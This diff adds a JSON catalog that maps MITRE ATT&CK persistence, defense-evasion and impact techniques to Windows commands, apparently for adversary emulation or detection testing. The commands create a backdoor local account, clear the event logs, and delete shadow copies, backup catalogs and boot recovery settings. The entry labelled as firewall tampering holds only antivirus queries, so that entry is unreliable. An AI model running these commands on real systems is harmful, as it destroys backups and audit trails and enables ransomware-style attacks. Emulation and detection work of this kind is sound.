@@ -1,0 +1,79 @@
+{
+    "TA0003": {
+        "Name": "Persistence",
+        "Description": "The adversary is trying to maintain their foothold.",
+        "Technique": {
+            "T1136": {
+                "Name": "Create Account",
+                "Description": "Adversaries may create an account to maintain access to victim systems.",
+                "SubTechnique": {
+                        "T1136.001": {
+                            "Name": "Local Account",
+                            "Description": "Adversaries may create a local account to maintain access to victim systems.",
+                            "Procedure": {
+                                "000": "net.exe user Fulanito abc123 /add"
+                            }
+                        }
+                }
+            }
+        }
+    },
+
+    "TA0005": {
+        "Name": "Defense Evasion",
+        "Description": "The adversary is trying to avoid being detected.",
+        "Technique": {
+                "T1070": {
+                    "Name": "Indicator Removal on Host",
+                    "Description": "Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware.",
+                    "SubTechnique": {
+                        "T1070.001": {
+                            "Name": "Clear Windows Event Logs",
+                            "Description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion.",
+                            "Procedure": {
+                                "000": "wevtutil.exe cl Application",
+                                "001": "wevtutil.exe cl Security",
+                                "002": "wevtutil.exe cl System"
+                                }
+                        }
+                    }
+                },
+
+                "T1562": {
+                    "Name": "Impair Defenses",
+                    "Description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.",
+                    "SubTechnique": {
+                        "T1562.004": {
+                            "Name": "Disable or Modify System Firewall",
+                            "Description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage.",
+                            "Procedure": {
+                                "000": "wmic.exe /namespace:\\\\root\\securitycenter2 path antivirusproduct",
+                                "001": "powershell.exe Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct",
+                                "002": "query \"HKLM\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av\" /s"
+                                }
+                        }
+                    }
+                }
+        }
+    },
+
+    "TA0040": {
+        "Name": "Impact",
+        "Description": "The adversary is trying to manipulate, interrupt, or destroy your systems and data.",
+        "Technique": {
+            "T1490": {
+                "Name": "Inhibit System Recovery",
+                "Description": "Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.",
+                "Procedure": {
+                    "000": "vssadmin.exe delete shadows /all /quiet",
+                    "001": "vssadmin.exe resize shadowstorage /for=c: /on=c: /maxsize=401MB",
+                    "002": "wmic.exe shadowcopy delete /nointeractive",
+                    "003": "powershell.exe Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}",
+                    "004": "wbadmin.exe delete catalog -quiet",
+                    "005": "bcdedit.exe /set {{default}} bootstatuspolicy ignoreallfailures",
+                    "006": "bcdedit.exe /set {{default}} recoveryenabled no"
+                }
+            }
+        }
+    }
+}
